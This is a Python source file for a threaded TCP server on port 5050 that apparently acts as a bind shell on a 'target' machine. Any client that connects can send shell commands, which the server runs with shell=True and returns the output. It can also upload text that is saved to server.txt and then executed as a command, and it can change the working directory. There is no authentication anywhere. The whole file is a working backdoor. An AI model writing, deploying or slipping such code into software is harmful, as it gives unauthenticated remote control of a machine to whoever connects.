import socket
import threading
import subprocess
from subprocess import CalledProcessError
import os

HEADER = 64
PORT = 5050
SERVER = socket.gethostbyname(socket.gethostname())
print(SERVER)
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!disconnect"
FILENAME = "server.txt"
FILESIZE = os.path.getsize(FILENAME)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

def handle_client(conn, addr):
    print(f"[NEW CONNECTION] {addr} connected. ")
    
    while True:
        msg = conn.recv(1048576).decode(FORMAT)
        if msg == DISCONNECT_MESSAGE:
            break
        # Checking Type
        elif msg == "file":
            msg_file_len = conn.recv(HEADER).decode(FORMAT)
            if msg_file_len:
                msg_file_len = int(msg_file_len)
                msg_file = conn.recv(msg_file_len).decode(FORMAT)
                    
                with open('server.txt', 'w') as f:
                    f.write(msg_file)            
                def injection():
                    file = open('server.txt', 'r')
                    content = file.read()

                    output = subprocess.check_output(content, shell=True)

                    output = output.decode('utf-8')

                    with open('server.txt', 'w') as f:
                        f.write(output)

                    file.close()
                injection()
        
                data = f"{FILENAME}_{FILESIZE}"
                conn.send(data.encode(FORMAT))

                with open(FILENAME, "rb") as f:
                        data = f.read(1048576)
                        conn.send(data)
        elif msg == "send":
             normal_msg_len = conn.recv(HEADER).decode(FORMAT)
             if normal_msg_len:
                    normal_msg_len = int(normal_msg_len)
                    normal_msg = conn.recv(normal_msg_len).decode(FORMAT)
                    checking = normal_msg.split(" ")
                    if checking[0] == "change":
                        os.chdir(checking[1])
                        change = "DONE".encode(FORMAT)
                        conn.send(change)
                    else:
                        try:
                            normal_output = subprocess.check_output(normal_msg, shell=True)
                            conn.send(normal_output)
                        except CalledProcessError as err:
                            message = "AN ERROR OCCURED".encode(FORMAT)
                            conn.send(message)
    conn.close()
    print("---[USER DISCONNECTED]---")
    print(f"[LISTINING] Server is listening on {SERVER}")

def start():
    server.listen(5)
    print(f"[LISTINING] Server is listening on {SERVER}")
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")

print("[STARTING] the target is starting....")
start()